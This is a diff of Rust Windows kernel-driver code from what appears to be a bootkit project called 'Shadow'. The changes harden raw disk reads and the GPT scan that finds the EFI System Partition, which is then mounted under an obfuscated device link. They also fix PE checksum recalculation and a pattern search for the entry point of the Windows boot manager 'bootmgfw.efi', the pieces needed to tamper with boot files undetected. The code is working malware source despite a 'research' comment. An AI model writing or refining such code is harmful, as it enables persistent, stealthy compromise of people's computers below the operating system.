@@ -126,22 +126,23 @@ pub unsafe fn read_disk_lba(disk_num: u32, lba: u64, buffer: &mut [u8]) -> Shado
         return Err(ShadowError::ApiCallFailed("ZwCreateFile(Disk)", status));
     }
 
-    let mut byte_offset = core::mem::zeroed::<wdk_sys::_LARGE_INTEGER>();
+    let h_file = crate::utils::handle::Handle::new(h_file);
+    let mut byte_offset = unsafe { core::mem::zeroed::<wdk_sys::_LARGE_INTEGER>() };
     *byte_offset.QuadPart_mut() = (lba * 512) as i64;
 
-    let status = ZwReadFile(
-        h_file,
-        core::ptr::null_mut(),
-        None,
-        core::ptr::null_mut(),
-        &mut io_status,
-        buffer.as_mut_ptr() as *mut _,
-        512,
-        &mut byte_offset,
-        core::ptr::null_mut(),
-    );
-
-    ZwClose(h_file);
+    let status = unsafe {
+        ZwReadFile(
+            h_file.get(),
+            core::ptr::null_mut(),
+            None,
+            core::ptr::null_mut(),
+            &mut io_status,
+            buffer.as_mut_ptr() as *mut _,
+            buffer.len() as u32,
+            &mut byte_offset,
+            core::ptr::null_mut(),
+        )
+    };
 
     if wdk_sys::NT_SUCCESS(status) {
         Ok(())
@@ -168,29 +169,35 @@ pub unsafe fn mount_esp_production() -> ShadowResult<NTSTATUS> {
     use crate::utils::unicode_string::UnicodeString;
     let link = UnicodeString::new(obfstr::obfstr!("\\Device\\ShadowESP"));
     
-    for disk in 0..4 {
+    for disk in 0..8 { // Increased disk scan range
         let mut header_buf = [0u8; 512];
         if read_disk_lba(disk, 1, &mut header_buf).is_err() { continue; }
         
-        let header = &*(header_buf.as_ptr() as *const GptHeader);
+        // Alignment-safe read
+        let header: GptHeader = unsafe { core::ptr::read_unaligned(header_buf.as_ptr() as *const GptHeader) };
         if header.signature != 0x5452415020494645 { continue; } // "EFI PART"
         
-        // Iterate Partition Entries
-        let mut entry_buf = [0u8; 512];
-        for i in 0..header.num_partition_entries {
-            let entry_lba = header.partition_entry_lba + (i * header.size_partition_entry as u32 / 512) as u64;
+        let entries_per_sector = 512 / header.size_partition_entry;
+        
+        // Iterate Partition Entries (limit to 128 to stay within kernel timing bounds)
+        let num_entries = core::cmp::min(header.num_partition_entries, 128);
+        for i in 0..num_entries {
+            let entry_sector_offset = i / entries_per_sector;
+            let entry_lba = header.partition_entry_lba + entry_sector_offset as u64;
+            
+            let mut entry_buf = [0u8; 512];
             if read_disk_lba(disk, entry_lba, &mut entry_buf).is_ok() {
-                let entry = &*(entry_buf.as_ptr() as *const GptPartitionEntry);
+                let offset = (i % entries_per_sector) * header.size_partition_entry;
+                let entry: GptPartitionEntry = unsafe { 
+                    core::ptr::read_unaligned(entry_buf.as_ptr().add(offset as usize) as *const GptPartitionEntry) 
+                };
+                
                 if entry.partition_type_guid == EFI_SYSTEM_PARTITION_GUID {
-                    // Found ESP. Check BitLocker on the volume corresponding to this partition
-                    // (Simulating volume mapping logic)
                     if is_bitlocker_enabled(disk).unwrap_or(false) {
                         log::warn!("🚫 ESP on Disk {} is protected by BitLocker. Aborting.", disk);
                         continue;
                     }
 
-                    // In a real environment, we'd resolve this to \Device\HarddiskVolumeX
-                    // For research, we link to the suspected volume 1
                     let target_str = alloc::format!("\\Device\\HarddiskVolume1");
                     let target = UnicodeString::new(&target_str);
                     let status = wdk_sys::ntddk::IoCreateSymbolicLink(link.as_ptr(), target.as_ptr());
@@ -211,8 +218,9 @@ pub unsafe fn mount_esp_production() -> ShadowResult<NTSTATUS> {
 pub fn recalculate_pe_checksum(data: &mut [u8]) -> ShadowResult<()> {
     use crate::data::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS};
     
-    let dos_header = data.as_ptr() as *const IMAGE_DOS_HEADER;
-    let nt_headers_ptr = (data.as_ptr() as usize + unsafe { (*dos_header).e_lfanew } as usize) as *mut IMAGE_NT_HEADERS;
+    let dos_header_ptr = data.as_ptr() as *const IMAGE_DOS_HEADER;
+    let dos_header = unsafe { core::ptr::read_unaligned(dos_header_ptr) };
+    let nt_headers_ptr = (data.as_ptr() as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS;
     
     unsafe {
         (*nt_headers_ptr).OptionalHeader.CheckSum = 0; // Reset before calculating
@@ -222,14 +230,17 @@ pub fn recalculate_pe_checksum(data: &mut [u8]) -> ShadowResult<()> {
         let p = data.as_ptr() as *const u16;
         
         for i in 0..count {
-            checksum += unsafe { *p.add(i) } as u64;
-            checksum = (checksum & 0xFFFFFFFF) + (checksum >> 32);
+            checksum += core::ptr::read_unaligned(p.add(i)) as u64;
+            if checksum > 0xFFFFFFFF {
+                checksum = (checksum & 0xFFFFFFFF) + (checksum >> 32);
+            }
         }
         
-        checksum = (checksum & 0xFFFF) + (checksum >> 16);
-        checksum += checksum >> 16;
-        checksum = (checksum & 0xFFFF) + data.len() as u64;
+        while checksum >> 16 != 0 {
+            checksum = (checksum & 0xFFFF) + (checksum >> 16);
+        }
         
+        checksum += data.len() as u64;
         (*nt_headers_ptr).OptionalHeader.CheckSum = checksum as u32;
     }
     
@@ -241,7 +252,10 @@ pub fn find_oep_pattern(data: &[u8]) -> ShadowResult<usize> {
     // Pattern for 'bootmgfw.efi' entry transition (example)
     // 48 8B C4 48 89 58 08 44 89 48 20 55 56 57 41 54 41 55 41 56 41 57 48 8D 68 A1 48 81 EC
     let pattern = [0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08];
-    for i in 0..data.len() - pattern.len() {
+    if data.len() < pattern.len() {
+        return Err(ShadowError::VerificationFailed("Buffer too small for pattern"));
+    }
+    for i in 0..=(data.len() - pattern.len()) {
         if &data[i..i+pattern.len()] == pattern {
             return Ok(i);
         }
